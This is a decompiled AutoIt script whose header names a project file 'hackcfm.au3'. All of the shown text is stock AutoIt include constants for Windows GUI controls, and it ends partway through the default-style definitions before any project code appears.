; <AUT2EXE VERSION: 3.2.4.9>
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: K:\longnhi\tool\project\hackcfm.au3>
; ----------------------------------------------------------------------------
#cs ----------------------------------------------------------------------------
 AutoIt Version: 3.2.2.0
 Author:         longnhi
#ce ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\GUIConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\GUIDefaultConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\WindowsConstants.au3>
; ----------------------------------------------------------------------------
Global Const $WS_TILED				= 0
Global Const $WS_OVERLAPPED 		= 0
Global Const $WS_MAXIMIZEBOX		= 0x00010000
Global Const $WS_MINIMIZEBOX		= 0x00020000
Global Const $WS_TABSTOP			= 0x00010000
Global Const $WS_GROUP				= 0x00020000
Global Const $WS_SIZEBOX			= 0x00040000
Global Const $WS_THICKFRAME			= 0x00040000
Global Const $WS_SYSMENU			= 0x00080000
Global Const $WS_HSCROLL			= 0x00100000
Global Const $WS_VSCROLL			= 0x00200000
Global Const $WS_DLGFRAME 			= 0x00400000
Global Const $WS_BORDER				= 0x00800000
Global Const $WS_CAPTION			= 0x00C00000
Global Const $WS_OVERLAPPEDWINDOW	= 0x00CF0000
Global Const $WS_TILEDWINDOW		= 0x00CF0000
Global Const $WS_MAXIMIZE			= 0x01000000
Global Const $WS_CLIPCHILDREN		= 0x02000000
Global Const $WS_CLIPSIBLINGS		= 0x04000000
Global Const $WS_DISABLED 			= 0x08000000
Global Const $WS_VISIBLE			= 0x10000000
Global Const $WS_MINIMIZE			= 0x20000000
Global Const $WS_CHILD				= 0x40000000
Global Const $WS_POPUP				= 0x80000000
Global Const $WS_POPUPWINDOW		= 0x80880000
Global Const $DS_MODALFRAME 		= 0x80
Global Const $DS_SETFOREGROUND		= 0x00000200
Global Const $DS_CONTEXTHELP		= 0x00002000
Global Const $WS_EX_ACCEPTFILES			= 0x00000010
Global Const $WS_EX_MDICHILD			= 0x00000040
Global Const $WS_EX_APPWINDOW			= 0x00040000
Global Const $WS_EX_CLIENTEDGE			= 0x00000200
Global Const $WS_EX_CONTEXTHELP			= 0x00000400
Global Const $WS_EX_DLGMODALFRAME 		= 0x00000001
Global Const $WS_EX_LEFTSCROLLBAR 		= 0x00004000
Global Const $WS_EX_OVERLAPPEDWINDOW	= 0x00000300
Global Const $WS_EX_RIGHT				= 0x00001000
Global Const $WS_EX_STATICEDGE			= 0x00020000
Global Const $WS_EX_TOOLWINDOW			= 0x00000080
Global Const $WS_EX_TOPMOST				= 0x00000008
Global Const $WS_EX_TRANSPARENT			= 0x00000020
Global Const $WS_EX_WINDOWEDGE			= 0x00000100
Global Const $WS_EX_LAYERED				= 0x00080000
Global Const $WM_SIZE = 0x05
Global Const $WM_SIZING = 0x0214
Global Const $WM_USER = 0X400
Global Const $WM_GETTEXTLENGTH = 0x000E
Global Const $WM_GETTEXT = 0x000D
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\WindowsConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\AVIConstants.au3>
; ----------------------------------------------------------------------------
Global Const $ACS_CENTER			= 1
Global Const $ACS_TRANSPARENT		= 2
Global Const $ACS_AUTOPLAY			= 4
Global Const $ACS_TIMER				= 8
Global Const $ACS_NONTRANSPARENT	= 16
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\AVIConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\ComboConstants.au3>
; ----------------------------------------------------------------------------
Global Const $CBS_SIMPLE			= 0x0001
Global Const $CBS_DROPDOWN			= 0x0002
Global Const $CBS_DROPDOWNLIST		= 0x0003
Global Const $CBS_AUTOHSCROLL		= 0x0040
Global Const $CBS_OEMCONVERT		= 0x0080
Global Const $CBS_SORT				= 0x0100
Global Const $CBS_NOINTEGRALHEIGHT	= 0x0400
Global Const $CBS_DISABLENOSCROLL	= 0x0800
Global Const $CBS_UPPERCASE			= 0x2000
Global Const $CBS_LOWERCASE			= 0x4000
Global Const $CB_ERR = -1
Global Const $CB_ERRATTRIBUTE = -3
Global Const $CB_ERRREQUIRED = -4
Global Const $CB_ERRSPACE = -2
Global Const $CB_OKAY = 0
Global Const $CB_ADDSTRING = 0x143
Global Const $CB_DELETESTRING = 0x144
Global Const $CB_DIR = 0x145
Global Const $CB_FINDSTRING = 0x14C
Global Const $CB_FINDSTRINGEXACT = 0x158
Global Const $CB_GETCOUNT = 0x146
Global Const $CB_GETCURSEL = 0x147
Global Const $CB_GETDROPPEDCONTROLRECT = 0x152
Global Const $CB_GETDROPPEDSTATE = 0x157
Global Const $CB_GETDROPPEDWIDTH = 0X15f
Global Const $CB_GETEDITSEL = 0x140
Global Const $CB_GETEXTENDEDUI = 0x156
Global Const $CB_GETHORIZONTALEXTENT = 0x15d
Global Const $CB_GETITEMDATA = 0x150
Global Const $CB_GETITEMHEIGHT = 0x154
Global Const $CB_GETLBTEXT = 0x148
Global Const $CB_GETLBTEXTLEN = 0x149
Global Const $CB_GETLOCALE = 0x15A
Global Const $CB_GETMINVISIBLE = 0x1702
Global Const $CB_GETTOPINDEX = 0x15b
Global Const $CB_INITSTORAGE = 0x161
Global Const $CB_LIMITTEXT = 0x141
Global Const $CB_RESETCONTENT = 0x14B
Global Const $CB_INSERTSTRING = 0x14A
Global Const $CB_SELECTSTRING = 0x14D
Global Const $CB_SETCURSEL = 0x14E
Global Const $CB_SETDROPPEDWIDTH = 0x160
Global Const $CB_SETEDITSEL = 0x142
Global Const $CB_SETEXTENDEDUI = 0x155
Global Const $CB_SETHORIZONTALEXTENT = 0x15e
Global Const $CB_SETITEMDATA = 0x151
Global Const $CB_SETITEMHEIGHT = 0x153
Global Const $CB_SETLOCALE = 0x15
Global Const $CB_SETMINVISIBLE = 0x1701
Global Const $CB_SETTOPINDEX = 0x15c
Global Const $CB_SHOWDROPDOWN = 0x14F
Global Const $CB_DDL_ARCHIVE = 0x20
Global Const $CB_DDL_DIRECTORY = 0x10
Global Const $CB_DDL_DRIVES = 0x4000
Global Const $CB_DDL_EXCLUSIVE = 0x8000
Global Const $CB_DDL_HIDDEN = 0x2
Global Const $CB_DDL_READONLY = 0x1
Global Const $CB_DDL_READWRITE = 0x0
Global Const $CB_DDL_SYSTEM = 0x4
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\ComboConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\DateTimeConstants.au3>
; ----------------------------------------------------------------------------
Global Const $DTS_SHORTDATEFORMAT	= 0
Global Const $DTS_UPDOWN			= 1
Global Const $DTS_SHOWNONE			= 2
Global Const $DTS_LONGDATEFORMAT	= 4
Global Const $DTS_TIMEFORMAT		= 9
Global Const $DTS_RIGHTALIGN		= 32
Global Const $MCS_NOTODAY			= 16
Global Const $MCS_NOTODAYCIRCLE		= 8
Global Const $MCS_WEEKNUMBERS		= 4
Global Const $MCM_FIRST = 0x1000
Global Const $MCM_GETCOLOR = ($MCM_FIRST + 11)
Global Const $MCM_GETFIRSTDAYOFWEEK = ($MCM_FIRST + 16)
Global Const $MCM_GETMAXSELCOUNT = ($MCM_FIRST + 3)
Global Const $MCM_GETMAXTODAYWIDTH = ($MCM_FIRST + 21)
Global Const $MCM_GETMINREQRECT = ($MCM_FIRST + 9)
Global Const $MCM_GETMONTHDELTA = ($MCM_FIRST + 19)
Global Const $MCS_MULTISELECT = 0x2
Global Const $MCM_SETCOLOR = ($MCM_FIRST + 10)
Global Const $MCM_SETFIRSTDAYOFWEEK = ($MCM_FIRST + 15)
Global Const $MCM_SETMAXSELCOUNT = ($MCM_FIRST + 4)
Global Const $MCM_SETMONTHDELTA = ($MCM_FIRST + 20)
Global Const $MCSC_BACKGROUND = 0
Global Const $MCSC_MONTHBK = 4
Global Const $MCSC_TEXT = 1
Global Const $MCSC_TITLEBK = 2
Global Const $MCSC_TITLETEXT = 3
Global Const $MCSC_TRAILINGTEXT = 5
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\DateTimeConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\EditConstants.au3>
; ----------------------------------------------------------------------------
Global Const $ES_LEFT				= 0
Global Const $ES_CENTER				= 1
Global Const $ES_RIGHT				= 2
Global Const $ES_MULTILINE			= 4
Global Const $ES_UPPERCASE			= 8
Global Const $ES_LOWERCASE			= 16
Global Const $ES_PASSWORD			= 32
Global Const $ES_AUTOVSCROLL		= 64
Global Const $ES_AUTOHSCROLL		= 128
Global Const $ES_NOHIDESEL			= 256
Global Const $ES_OEMCONVERT			= 1024
Global Const $ES_READONLY			= 2048
Global Const $ES_WANTRETURN			= 4096
Global Const $ES_NUMBER				= 8192
Global Const $EC_ERR = -1
Global Const $ECM_FIRST = 0X1500
Global Const $EM_CANUNDO = 0xC6
Global Const $EM_EMPTYUNDOBUFFER = 0xCD
Global Const $EM_GETFIRSTVISIBLELINE = 0xCE
Global Const $EM_GETLINE = 0xC4
Global Const $EM_GETLINECOUNT = 0xBA
Global Const $EM_GETMODIFY = 0xB8
Global Const $EM_GETRECT = 0xB2
Global Const $EM_GETSEL = 0xB0
Global Const $EM_LINEFROMCHAR = 0xC9
Global Const $EM_LINEINDEX = 0xBB
Global Const $EM_LINELENGTH = 0xC1
Global Const $EM_LINESCROLL = 0xB6
Global Const $EM_REPLACESEL = 0xC2
Global Const $EM_SCROLL = 0xB5
Global Const $EM_SCROLLCARET = 0x00B7
Global Const $EM_SETMODIFY = 0xB9
Global Const $EM_SETSEL = 0xB1
Global Const $EM_UNDO = 0xC7
Global Const $EM_SETREADONLY = 0x00CF
Global Const $EM_SETTABSTOPS = 0x00CB
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\EditConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\StaticConstants.au3>
; ----------------------------------------------------------------------------
Global Const $SS_LEFT			= 0
Global Const $SS_CENTER			= 1
Global Const $SS_RIGHT			= 2
Global Const $SS_ICON			= 3
Global Const $SS_BLACKRECT		= 4
Global Const $SS_GRAYRECT		= 5
Global Const $SS_WHITERECT		= 6
Global Const $SS_BLACKFRAME		= 7
Global Const $SS_GRAYFRAME		= 8
Global Const $SS_WHITEFRAME		= 9
Global Const $SS_SIMPLE			= 11
Global Const $SS_LEFTNOWORDWRAP	= 12
Global Const $SS_BITMAP			= 15
Global Const $SS_ETCHEDHORZ		= 16
Global Const $SS_ETCHEDVERT		= 17
Global Const $SS_ETCHEDFRAME	= 18
Global Const $SS_NOPREFIX		= 0x0080
Global Const $SS_NOTIFY			= 0x0100
Global Const $SS_CENTERIMAGE	= 0x0200
Global Const $SS_RIGHTJUST		= 0x0400
Global Const $SS_SUNKEN			= 0x1000
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\StaticConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\ListBoxConstants.au3>
; ----------------------------------------------------------------------------
Global Const $LBS_NOTIFY			= 0x0001
Global Const $LBS_SORT				= 0x0002
Global Const $LBS_USETABSTOPS		= 0x0080
Global Const $LBS_NOINTEGRALHEIGHT	= 0x0100
Global Const $LBS_DISABLENOSCROLL	= 0x1000
Global Const $LBS_NOSEL				= 0x4000
Global Const $LBS_STANDARD			= 0xA00003
Global Const $LB_ERR = -1
Global Const $LB_ERRATTRIBUTE = -3
Global Const $LB_ERRREQUIRED = -4
Global Const $LB_ERRSPACE = -2
Global Const $LB_ADDSTRING = 0x180
Global Const $LB_DELETESTRING = 0x182
Global Const $LB_DIR = 0x18D
Global Const $LB_FINDSTRING = 0x18F
Global Const $LB_FINDSTRINGEXACT = 0x1A2
Global Const $LB_GETANCHORINDEX = 0x019D
Global Const $LB_GETCARETINDEX = 0x019F
Global Const $LB_GETCOUNT = 0x18B
Global Const $LB_GETCURSEL = 0x188
Global Const $LB_GETHORIZONTALEXTENT = 0x193
Global Const $LB_GETITEMRECT = 0x198
Global Const $LB_GETLISTBOXINFO = 0x01B2
Global Const $LB_GETLOCALE = 0x1A6
Global Const $LB_GETSEL = 0x0187
Global Const $LB_GETSELCOUNT = 0x0190
Global Const $LB_GETSELITEMS = 0X191
Global Const $LB_GETTEXT = 0x0189
Global Const $LB_GETTEXTLEN = 0x018A
Global Const $LB_GETTOPINDEX = 0x018E
Global Const $LB_INSERTSTRING = 0x181
Global Const $LB_RESETCONTENT = 0x184
Global Const $LB_SELECTSTRING = 0x18C
Global Const $LB_SETITEMHEIGHT = 0x1A0
Global Const $LB_SELITEMRANGE = 0x19B
Global Const $LB_SELITEMRANGEEX = 0x0183
Global Const $LB_SETANCHORINDEX = 0x19C
Global Const $LB_SETCARETINDEX = 0x19E
Global Const $LB_SETCURSEL = 0x186
Global Const $LB_SETHORIZONTALEXTENT = 0x194
Global Const $LB_SETLOCALE = 0x1A5
Global Const $LB_SETSEL = 0x0185
Global Const $LB_SETTOPINDEX = 0x197
Global Const $LBS_MULTIPLESEL = 0x8
Global Const $DDL_ARCHIVE = 0x20
Global Const $DDL_DIRECTORY = 0x10
Global Const $DDL_DRIVES = 0x4000
Global Const $DDL_EXCLUSIVE = 0x8000
Global Const $DDL_HIDDEN = 0x2
Global Const $DDL_READONLY = 0x1
Global Const $DDL_READWRITE = 0x0
Global Const $DDL_SYSTEM = 0x4
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\ListBoxConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\ListViewConstants.au3>
; ----------------------------------------------------------------------------
Global Const $LVS_ICON	 			= 0x0000
Global Const $LVS_REPORT 			= 0x0001
Global Const $LVS_SMALLICON			= 0x0002
Global Const $LVS_LIST				= 0x0003
Global Const $LVS_EDITLABELS		= 0x0200
Global Const $LVS_NOCOLUMNHEADER	= 0x4000
Global Const $LVS_NOSORTHEADER		= 0x8000
Global Const $LVS_SINGLESEL			= 0x0004
Global Const $LVS_SHOWSELALWAYS		= 0x0008
Global Const $LVS_SORTASCENDING		= 0X0010
Global Const $LVS_SORTDESCENDING	= 0x0020
Global Const $LVS_NOLABELWRAP		= 0x0080
Global Const $LVS_EX_FULLROWSELECT		= 0x00000020
Global Const $LVS_EX_GRIDLINES			= 0x00000001
Global Const $LVS_EX_SUBITEMIMAGES		= 0x00000002
Global Const $LVS_EX_CHECKBOXES			= 0x00000004
Global Const $LVS_EX_TRACKSELECT		= 0x00000008
Global Const $LVS_EX_HEADERDRAGDROP		= 0x00000010
Global Const $LVS_EX_FLATSB				= 0x00000100
Global Const $LVS_EX_BORDERSELECT		= 0x00008000
Global Const $LVS_EX_HIDELABELS = 0x20000
Global Const $LVS_EX_INFOTIP = 0x400
Global Const $LVS_EX_LABELTIP = 0x4000
Global Const $LVS_EX_ONECLICKACTIVATE = 0x40
Global Const $LVS_EX_REGIONAL = 0x200
Global Const $LVS_EX_SINGLEROW = 0x40000
Global Const $LVS_EX_TWOCLICKACTIVATE = 0x80
Global Const $LVS_EX_UNDERLINEHOT = 0x800
Global Const $LVS_EX_UNDERLINECOLD = 0x1000
Global Const $LV_ERR = -1
Global Const $CCM_FIRST = 0x2000
Global Const $CCM_GETUNICODEFORMAT = ($CCM_FIRST + 6)
Global Const $CCM_SETUNICODEFORMAT = ($CCM_FIRST + 5)
Global Const $CLR_NONE = 0xFFFFFFFF
Global Const $LVM_FIRST = 0x1000
Global Const $LV_VIEW_DETAILS = 0x1
Global Const $LV_VIEW_ICON = 0x0
Global Const $LV_VIEW_LIST = 0x3
Global Const $LV_VIEW_SMALLICON = 0x2
Global Const $LV_VIEW_TILE = 0x4
Global Const $LVCF_FMT = 0x1
Global Const $LVCF_WIDTH = 0x2
Global Const $LVCF_TEXT = 0x4
Global Const $LVCFMT_CENTER = 0x2
Global Const $LVCFMT_LEFT = 0x0
Global Const $LVCFMT_RIGHT = 0x1
Global Const $LVA_ALIGNLEFT = 0x1
Global Const $LVA_ALIGNTOP = 0x2
Global Const $LVA_DEFAULT = 0x0
Global Const $LVA_SNAPTOGRID = 0x5
Global Const $LVIF_STATE = 0x8
Global Const $LVIF_TEXT = 0x1
Global Const $LVFI_PARAM = 0x1
Global Const $LVFI_PARTIAL = 0x8
Global Const $LVFI_STRING = 0x2
Global Const $LVFI_WRAP = 0x20
Global Const $VK_LEFT = 0x25
Global Const $VK_RIGHT = 0x27
Global Const $VK_UP = 0x26
Global Const $VK_DOWN = 0x28
Global Const $VK_END = 0x23
Global Const $VK_PRIOR = 0x21
Global Const $VK_NEXT = 0x22
Global Const $LVIR_BOUNDS = 0
Global Const $LVIS_CUT = 0x4
Global Const $LVIS_DROPHILITED = 0x8
Global Const $LVIS_FOCUSED = 0x1
Global Const $LVIS_OVERLAYMASK = 0xF00
Global Const $LVIS_SELECTED = 0x2
Global Const $LVIS_STATEIMAGEMASK = 0xF000
Global Const $LVM_ARRANGE = ($LVM_FIRST + 22)
Global Const $LVM_CANCELEDITLABEL = ($LVM_FIRST + 179)
Global Const $LVM_DELETECOLUMN = 0x101C
Global Const $LVM_DELETEITEM = 0x1008
Global Const $LVM_DELETEALLITEMS = 0x1009
Global Const $LVM_EDITLABELA = ($LVM_FIRST + 23)
Global Const $LVM_EDITLABEL = $LVM_EDITLABELA
Global Const $LVM_ENABLEGROUPVIEW = ($LVM_FIRST + 157)
Global Const $LVM_ENSUREVISIBLE = ($LVM_FIRST + 19)
Global Const $LVM_FINDITEM = ($LVM_FIRST + 13)
Global Const $LVM_GETBKCOLOR = ($LVM_FIRST + 0)
Global Const $LVM_GETCALLBACKMASK = ($LVM_FIRST + 10)
Global Const $LVM_GETCOLUMNORDERARRAY = ($LVM_FIRST + 59)
Global Const $LVM_GETCOLUMNWIDTH = ($LVM_FIRST + 29)
Global Const $LVM_GETCOUNTPERPAGE = ($LVM_FIRST + 40)
Global Const $LVM_GETEDITCONTROL = ($LVM_FIRST + 24)
Global Const $LVM_GETEXTENDEDLISTVIEWSTYLE = ($LVM_FIRST + 55)
Global Const $LVM_GETHEADER = ($LVM_FIRST + 31)
Global Const $LVM_GETHOTCURSOR = ($LVM_FIRST + 63)
Global Const $LVM_GETHOTITEM = ($LVM_FIRST + 61)
Global Const $LVM_GETHOVERTIME = ($LVM_FIRST + 72)
Global Const $LVM_GETIMAGELIST = ($LVM_FIRST + 2)
Global Const $LVM_GETITEMA = ($LVM_FIRST + 5)
Global Const $LVM_GETITEMCOUNT = 0x1004
Global Const $LVM_GETITEMSTATE = ($LVM_FIRST + 44)
Global Const $LVM_GETITEMTEXTA = ($LVM_FIRST + 45)
Global Const $LVM_GETNEXTITEM = 0x100c
Global Const $LVM_GETSELECTEDCOLUMN = ($LVM_FIRST + 174)
Global Const $LVM_GETSELECTEDCOUNT = ($LVM_FIRST + 50)
Global Const $LVM_GETSUBITEMRECT = ($LVM_FIRST + 56)
Global Const $LVM_GETTOPINDEX = ($LVM_FIRST + 39)
Global Const $LVM_GETUNICODEFORMAT = $CCM_GETUNICODEFORMAT
Global Const $LVM_GETVIEW = ($LVM_FIRST + 143)
Global Const $LVM_GETVIEWRECT = ($LVM_FIRST + 34)
Global Const $LVM_INSERTCOLUMNA = ($LVM_FIRST + 27)
Global Const $LVM_INSERTITEMA = ($LVM_FIRST + 7)
Global Const $LVM_REDRAWITEMS = ($LVM_FIRST + 21)
Global Const $LVM_SETUNICODEFORMAT = $CCM_SETUNICODEFORMAT
Global Const $LVM_SCROLL = ($LVM_FIRST + 20)
Global Const $LVM_SETBKCOLOR = 0x1001
Global Const $LVM_SETCALLBACKMASK = ($LVM_FIRST + 11)
Global Const $LVM_SETCOLUMNA = ($LVM_FIRST + 26)
Global Const $LVM_SETCOLUMNORDERARRAY = ($LVM_FIRST + 58)
Global Const $LVM_SETCOLUMNWIDTH = 0x101E
Global Const $LVM_SETEXTENDEDLISTVIEWSTYLE = 0x1036
Global Const $LVM_SETHOTITEM = ($LVM_FIRST + 60)
Global Const $LVM_SETHOVERTIME = ($LVM_FIRST + 71)
Global Const $LVM_SETICONSPACING = ($LVM_FIRST + 53)
Global Const $LVM_SETITEMCOUNT = ($LVM_FIRST + 47)
Global Const $LVM_SETITEMPOSITION = ($LVM_FIRST + 15)
Global Const $LVM_SETITEMSTATE = ($LVM_FIRST + 43)
Global Const $LVM_SETITEMTEXTA = ($LVM_FIRST + 46)
Global Const $LVM_SETSELECTEDCOLUMN = ($LVM_FIRST + 140)
Global Const $LVM_SETTEXTCOLOR = ($LVM_FIRST + 36)
Global Const $LVM_SETTEXTBKCOLOR = ($LVM_FIRST + 38)
Global Const $LVM_SETVIEW = ($LVM_FIRST + 142)
Global Const $LVM_UPDATE = ($LVM_FIRST + 42)
Global Const $LVNI_ABOVE = 0x100
Global Const $LVNI_BELOW = 0x200
Global Const $LVNI_TOLEFT = 0x400
Global Const $LVNI_TORIGHT = 0x800
Global Const $LVNI_ALL = 0x0
Global Const $LVNI_CUT = 0x4
Global Const $LVNI_DROPHILITED = 0x8
Global Const $LVNI_FOCUSED = 0x1
Global Const $LVNI_SELECTED = 0x2
Global Const $LVSCW_AUTOSIZE = -1
Global Const $LVSCW_AUTOSIZE_USEHEADER = -2
Global Const $LVSICF_NOINVALIDATEALL = 0x1
Global Const $LVSICF_NOSCROLL = 0x2
Global Const $LVSIL_NORMAL = 0
Global Const $LVSIL_SMALL = 1
Global Const $LVSIL_STATE = 2
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\ListViewConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\SliderConstants.au3>
; ----------------------------------------------------------------------------
Global Const $TBS_AUTOTICKS	= 0x0001
Global Const $TBS_VERT		= 0x0002
Global Const $TBS_HORZ		= 0x0000
Global Const $TBS_TOP		= 0x0004
Global Const $TBS_BOTTOM	= 0x0000
Global Const $TBS_LEFT		= 0x0004
Global Const $TBS_RIGHT		= 0x0000
Global Const $TBS_BOTH		= 0x0008
Global Const $TBS_NOTICKS	= 0x0010
Global Const $TBS_NOTHUMB	= 0x0080
Global Const $TWM_USER = 0x400
Global Const $TBM_CLEARTICS = ($TWM_USER + 9)
Global Const $TBM_GETLINESIZE = ($TWM_USER + 24)
Global Const $TBM_GETPAGESIZE = ($TWM_USER + 22)
Global Const $TBM_GETNUMTICS = ($TWM_USER + 16)
Global Const $TBM_GETPOS = $TWM_USER
Global Const $TBM_GETRANGEMAX = ($TWM_USER + 2)
Global Const $TBM_GETRANGEMIN = ($TWM_USER + 1)
Global Const $TBM_SETLINESIZE = ($TWM_USER + 23)
Global Const $TBM_SETPAGESIZE = ($TWM_USER + 21)
Global Const $TBM_SETPOS = ($TWM_USER + 5)
Global Const $TBM_SETTICFREQ = ($TWM_USER + 20)
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\SliderConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\TreeViewConstants.au3>
; ----------------------------------------------------------------------------
Global Const $TVS_HASBUTTONS     	= 0x0001
Global Const $TVS_HASLINES       	= 0x0002
Global Const $TVS_LINESATROOT    	= 0x0004
Global Const $TVS_DISABLEDRAGDROP	= 0x0010
Global Const $TVS_SHOWSELALWAYS		= 0x0020
Global Const $TVS_NOTOOLTIPS		= 0x0080
Global Const $TVS_CHECKBOXES		= 0x0100
Global Const $TVS_TRACKSELECT		= 0x0200
Global Const $TVS_SINGLEEXPAND		= 0x0400
Global Const $TVS_FULLROWSELECT		= 0x1000
Global Const $TVS_NOSCROLL			= 0x2000
Global Const $TVS_NONEVENHEIGHT		= 0x4000
Global Const $TVE_COLLAPSE			= 0x0001
Global Const $TVE_EXPAND			= 0x0002
Global Const $TVE_TOGGLE			= 0x0003
Global Const $TVE_EXPANDPARTIAL		= 0x4000
Global Const $TVE_COLLAPSERESET = 0x8000
Global Const $TVGN_ROOT				= 0x0000
Global Const $TVGN_NEXT				= 0x0001
Global Const $TVGN_PARENT			= 0x0003
Global Const $TVGN_CHILD			= 0x0004
Global Const $TVGN_CARET			= 0x0009
Global Const $TVI_ROOT				= 0xFFFF0000
Global Const $TVI_FIRST				= 0xFFFF0001
Global Const $TVI_LAST				= 0xFFFF0002
Global Const $TVI_SORT				= 0xFFFF0003
Global Const $TVIF_TEXT = 0x0001
Global Const $TVIF_IMAGE			= 0x0002
Global Const $TVIF_PARAM			= 0x0004
Global Const $TVIF_STATE			= 0x0008
Global Const $TVIF_HANDLE			= 0x0010
Global Const $TVIF_SELECTEDIMAGE	= 0x0020
Global Const $TVIF_CHILDREN			= 0x0040
Global Const $TVIS_SELECTED			= 0x0002
Global Const $TVIS_CUT				= 0x0004
Global Const $TVIS_DROPHILITED		= 0x0008
Global Const $TVIS_BOLD				= 0x0010
Global Const $TVIS_EXPANDED			= 0x0020
Global Const $TVIS_EXPANDEDONCE		= 0x0040
Global Const $TVIS_EXPANDPARTIAL	= 0x0080
Global Const $TVIS_OVERLAYMASK		= 0x0F00
Global Const $TVIS_STATEIMAGEMASK = 0xF000
Global Const $TV_FIRST				= 0x1100
Global Const $TVM_INSERTITEM		= $TV_FIRST + 0
Global Const $TVM_DELETEITEM		= $TV_FIRST + 1
Global Const $TVM_EXPAND			= $TV_FIRST + 2
Global Const $TVM_GETCOUNT			= $TV_FIRST + 5
Global Const $TVM_GETINDENT			= $TV_FIRST + 6
Global Const $TVM_SETINDENT			= $TV_FIRST + 7
Global Const $TVM_GETIMAGELIST		= $TV_FIRST + 8
Global Const $TVM_SETIMAGELIST		= $TV_FIRST + 9
Global Const $TVM_GETNEXTITEM		= $TV_FIRST + 10
Global Const $TVM_SELECTITEM		= $TV_FIRST + 11
Global Const $TVM_GETITEM			= $TV_FIRST + 12
Global Const $TVM_SETITEM			= $TV_FIRST + 13
Global Const $TVM_SORTCHILDREN		= $TV_FIRST + 19
Global Const $TVM_ENSUREVISIBLE		= $TV_FIRST + 20
Global Const $TVM_SETBKCOLOR		= $TV_FIRST + 29
Global Const $TVM_SETTEXTCOLOR		= $TV_FIRST + 30
Global Const $TVM_GETBKCOLOR		= $TV_FIRST + 31
Global Const $TVM_GETTEXTCOLOR		= $TV_FIRST + 32
Global Const $TVM_SETLINECOLOR		= $TV_FIRST + 40
Global Const $TVM_GETLINECOLOR		= $TV_FIRST + 41
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\TreeViewConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\UpDownConstants.au3>
; ----------------------------------------------------------------------------
Global Const $UDS_WRAP 				= 0x0001
Global Const $UDS_SETBUDDYINT		= 0x0002
Global Const $UDS_ALIGNRIGHT 		= 0x0004
Global Const $UDS_ALIGNLEFT			= 0x0008
Global Const $UDS_ARROWKEYS 		= 0x0020
Global Const $UDS_HORZ 				= 0x0040
Global Const $UDS_NOTHOUSANDS 		= 0x0080
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\UpDownConstants.au3>
; ----------------------------------------------------------------------------
Global Const $GUI_SS_DEFAULT_AVI		= $ACS_TRANSPARENT
Global Const $GUI_SS_DEFAULT_BUTTON		= 0
Global Const $GUI_SS_DEFAULT_CHECKBOX	= 0
Global Const $GUI_SS_DEFAULT_COMBO		= BitOR($CBS_DROPDOWN, $CBS_AUTOHSCROLL, $WS_VSCROLL)
Global Const $GUI_SS_DEFAULT_DATE		= $DTS_LONGDATEFORMAT
Global Const $GUI_SS_DEFAULT_EDIT		= BitOR($ES_WANTRETURN, $WS_VSCROLL, $WS_HSCROLL, $ES_AUTOVSCROLL, $ES_AUTOHSCROLL)
Global Const $GUI_SS_DEFAULT_GRAPHIC	= 0
Global Const $GUI_SS_DEFAULT_GROUP		= 0
Global Const $GUI_SS_DEFAULT_ICON		= $SS_NOTIFY
Global Const $GUI_SS_DEFAULT_INPUT		= BitOR($ES_LEFT, $ES_AUTOHSCROLL)
Global Const $GUI_SS_DEFAULT_LABEL		= 0
Global Const $GUI_SS_DEFAULT_LIST		= BitOR($LBS_SORT, $WS_BORDER, $WS_VSCROLL, $LBS_NOTIFY)
Global Const $GUI_SS_DEFAULT_LISTVIEW	= BitOR($LVS_SHOWSELALWAYS, $LVS_SINGLESEL)
Global Const $GUI_SS_DEFAULT_MONTHCAL	= 0
Global Const $GUI_SS_DEFAULT_PIC		= $SS_NOTIFY
Global Const $GUI_SS_DEFAULT_PROGRESS	= 0
